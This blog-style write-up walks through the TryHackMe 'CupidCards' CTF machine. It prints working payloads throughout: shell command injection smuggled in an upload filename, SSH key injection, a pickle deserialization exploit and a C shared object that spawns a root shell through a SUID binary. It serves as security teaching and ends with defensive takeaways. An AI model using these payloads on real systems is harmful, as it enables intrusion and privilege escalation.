---
title: "CupidCards - TryHackMe Valentine's 2026 CTF"
date: 2026-02-16
tags: ["tryhackme", "ctf", "boot2root", "command-injection", "pickle", "suid", "linux"]
difficulty: "Hard"
categories: ["writeups", "tryhackme"]
summary: "Boot2Root machine featuring blind command injection via forged multipart filename, pickle deserialization RCE for lateral movement, and a SUID binary with a hidden --dev flag for root."
---

# CupidCards — TryHackMe Valentine's 2026 CTF

**Difficulty:** Hard  
**Type:** Boot2Root  
**Flags:** 3 (user, aphrodite, root)

---

## Brief

> My Dearest Hacker, spread the love this Valentine's Day with CupidCards — the web app that lets you create personalised Valentine cards! Upload a photo, add a heartfelt message, and generate a custom card for that special someone.

---

## Enumeration

### Port Scan

The machine blocks ICMP so `-Pn` is required:

```bash
nmap -Pn -sC -sV -p- --min-rate 5000 10.66.187.215 -o cupidcards.nmap
```

The initial full scan only returned port 22 (SSH). A follow-up scan of ports 1–10000 revealed the web app:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
1337/tcp open  http    Werkzeug httpd 3.1.5 (Python 3.12.3)
```

Port 1337 — lets check it out

### Web Application

Browsing to `http://10.66.187.215:1337` revealed **CupidCards v1.4.14 "February Forever"** — a Flask app for generating Valentine's Day cards. The form accepted:

- A photo upload (PNG, JPG, GIF — max 16MB)
- `to_name` (max 50 chars)
- `from_name` (max 50 chars)
- `message` (max 200 chars)

Submitting the form POSTed to `/generate` and returned a generated card image at `/cards/card_<8hexchars>.png`.

Gobuster found only `/generate` — no admin panel, no additional endpoints.

---

## Initial Foothold — Blind Command Injection via Filename

### Discovery

After exhaustively testing SSTI in all text fields (which were heavily sanitised — stripping `{`, `}`, `(`, `)`, `[`, `]`, `$`, `` ` ``, `|`, `&`, `'`, `"`), file upload bypass attempts, ImageTragick, EXIF injection, and PNG metadata tricks, the attack surface narrowed to the **multipart filename**.

The server validated filenames with a strict regex (`^[a-zA-Z0-9]+\.[a-zA-Z]+$`) when submitted normally. However, by intercepting the request in Burp Suite and **manually editing the raw Content-Disposition header**, special characters could be smuggled past the client-side validation — and crucially, the server was passing the filename directly to a shell command without sanitisation.

### Confirming Injection

In Burp Repeater, changing the filename in the Content-Disposition:

```
Content-Disposition: form-data; name="photo"; filename="test.png;sleep 10;.png"
```

The response hung for exactly 10 seconds — **blind command injection confirmed**.

This is what allowed me to stop pulling my hair out and rejoice. I will be checking with sleep/wait/whatever much sooner in the future.

### Establishing Out-of-Band Output

after spending an embarrassing amount of time trying to create reverse and bind shells on a device with no connectivity(firewall blocked all ports except 22 and 1337), a file write approach was used to exfiltrate command output via the `/cards/` directory:

```
filename="test.png;dir=$(find / -name card_d8f69abf.png 2>/dev/null|head -1|xargs dirname);id>$dir/pwn.txt;.png"
```

```bash
curl http://10.66.187.215:1337/cards/pwn.txt
# uid=1001(cupid) gid=1001(cupid) groups=1001(cupid),1002(lovers)
```

Running as `cupid`.

### SSH Access via Authorized Keys

Since outbound reverse shells were blocked and bind shells couldn't be reached through the firewall, the SSH public key was injected into `cupid`'s authorized_keys:

```
filename="test.png;mkdir -p /home/cupid/.ssh;echo ssh-rsa AAAA...kw== smithh@kaliharry>>/home/cupid/.ssh/authorized_keys;.png"
```

```bash
ssh cupid@10.66.187.215
```

**User 1 flag:** `THM{REDACTED}`

---

## Lateral Movement — Pickle Deserialization RCE

### Enumeration as cupid

```bash
id
# uid=1001(cupid) gid=1001(cupid) groups=1001(cupid),1002(lovers)

find / -group lovers 2>/dev/null
# /opt/heartbreak/matcher/PROCESSING.md
# /var/spool/heartbreak/inbox
```

The `lovers` group had write access to `/var/spool/heartbreak/inbox`. Reading the PROCESSING.md:

```
Files must be valid MessagePack (.love extension).
Fields: from, to, desire (str, min 50 chars), compat (dict), notes (any)
Drop files in the spool directory for processing.
```

### Analysing the Matcher

`/opt/heartbreak/matcher/match_engine.py` processed `.love` files from the inbox every 60 seconds. The critical code path:

```python
if "notes" in data and isinstance(data["notes"], bytes):
    try:
        notes = hbproto.decode_notes(data["notes"])
    except Exception:
        notes = None
```

`hbproto.py` was obfuscated using Greek/Cyrillic variable names, but decoding the byte strings revealed:

```python
Φιλία = "pickle"      # "pickle"
Καρδιά = "loads"      # "loads"
Амур = pickle.loads   # THE VULNERABILITY
```

When `notes` was bytes, it called `pickle.loads()` — **arbitrary code execution via pickle deserialization**.

### Exploitation

```python
import msgpack, pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = ('mkdir -p /home/aphrodite/.ssh && '
               'echo "ssh-rsa AAAA...kw== smithh@kaliharry" '
               '>> /home/aphrodite/.ssh/authorized_keys && '
               'chmod 700 /home/aphrodite/.ssh && '
               'chmod 600 /home/aphrodite/.ssh/authorized_keys')
        return (os.system, (cmd,))

payload = {
    'from': 'cupid',
    'to': 'aphrodite',
    'desire': 'A' * 50,
    'compat': {'sign': 'aries', 'element': 'fire', 'planet': 'mars'},
    'notes': pickle.dumps(Exploit())
}

with open('/var/spool/heartbreak/inbox/pwn.love', 'wb') as f:
    f.write(msgpack.packb(payload))
```

After 60 seconds, the matcher processed the file as `aphrodite`, injecting our SSH key into her `authorized_keys`.

```bash
ssh aphrodite@10.66.187.215
```

**Flag 2:** `THM{REDACTED}`

---

## Privilege Escalation — SUID Binary with Hidden --dev Flag

### Enumeration as aphrodite

```bash
id
# uid=1002(aphrodite) gid=1003(aphrodite) groups=1003(aphrodite),1002(lovers),1004(hearts)

find / -perm -4000 -type f 2>/dev/null | grep -v snap
# /usr/local/bin/heartstring
```

`heartstring` was SUID root and executable by the `hearts` group — which `aphrodite` was a member of.

### Analysing heartstring

```bash
/usr/local/bin/heartstring status
# HeartString Status:
#   Plugin dir: /opt/heartbreak/plugins/
#   Manifest:   /opt/heartbreak/plugins/manifest.json
#   Plugins:    2 available

strings /usr/local/bin/heartstring | grep dev
# --dev
# [dev] Using local plugin: %s
```

A hidden `--dev` flag was present in the binary. Testing it:

```bash
/usr/local/bin/heartstring plugin evil --dev
# [dev] Using local plugin: /home/aphrodite/evil.so
# Error: plugin 'evil' not registered in manifest.
```

The `--dev` flag loaded plugins from the **current directory** rather than `/opt/heartbreak/plugins/` — bypassing the write restriction on that directory. The manifest still needed to list the plugin, but `manifest.json` was **group-writable by `hearts`**.

### Crafting the Malicious Plugin

```c
// evil.c
#include <stdlib.h>
#include <unistd.h>

void plugin_init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o ~/evil.so evil.c
sha256sum ~/evil.so
# b52aff89e15ea55854b3eb8afab3bf3a6a20d441b8ccaf941dafedcc9c5b252f
```

### Updating the Manifest

```bash
cat > /opt/heartbreak/plugins/manifest.json << 'EOF'
{
  "plugins": {
    "rosepetal": {"hash": "f7fb2b551f107ee61e20de29d153e1de027b44e50fd70cc50af36e08adc3b3bf", "description": "Rose petal animation plugin", "version": "1.0"},
    "loveletter": {"hash": "b47a17238fb47b6ef9d0d727453b0335f5bd4614cf415be27516d5a77e5f4643", "description": "Love letter formatter plugin", "version": "1.0"},
    "evil": {"hash": "b52aff89e15ea55854b3eb8afab3bf3a6a20d441b8ccaf941dafedcc9c5b252f", "description": "test", "version": "1.0"}
  }
}
EOF
```

### Root Shell

```bash
cd ~
/usr/local/bin/heartstring plugin evil --dev
# [dev] Using local plugin: /home/aphrodite/evil.so
# Loading plugin 'evil'...
# root@tryhackme-2404:/home/aphrodite#
```

**Root flag:** `cat /root/flag3.txt`

---

## Attack Chain Summary

```
Web App (port 1337)
    └── Blind Command Injection via forged multipart filename
            └── SSH key injection → cupid shell
                    └── Pickle RCE via MessagePack .love file processor
                            └── SSH key injection → aphrodite shell
                                    └── SUID heartstring --dev flag
                                            └── Malicious .so plugin → root
```

---

## Key Takeaways

**Blind Command Injection via Filename:** The server-side filename regex only applied to the `filename=` parameter in Content-Disposition when parsed through normal form submission. Manually crafting the multipart body in Burp allowed injecting shell metacharacters. Always sanitise filenames server-side before passing to any shell command, and use parameterised subprocess calls instead of string interpolation.

**Pickle Deserialization:** Never deserialize untrusted data with `pickle.loads()`. Python's pickle format allows arbitrary code execution by design. The obfuscation in `hbproto.py` using Unicode variable names provided zero security benefit. Use safer formats like JSON for inter-process communication.

**Hidden Developer Flags in SUID Binaries:** The `--dev` flag was never documented in the help output but existed in the binary. Combined with group-writable manifest files and a SUID binary, this created a straightforward privilege escalation path. Production SUID binaries should never include development/debugging functionality.

**Firewall Evasion:** When traditional reverse shells are blocked, alternative exfiltration methods (writing to web-accessible directories, SSH key injection) can achieve the same result. Always enumerate what network paths are available before assuming a dead end.
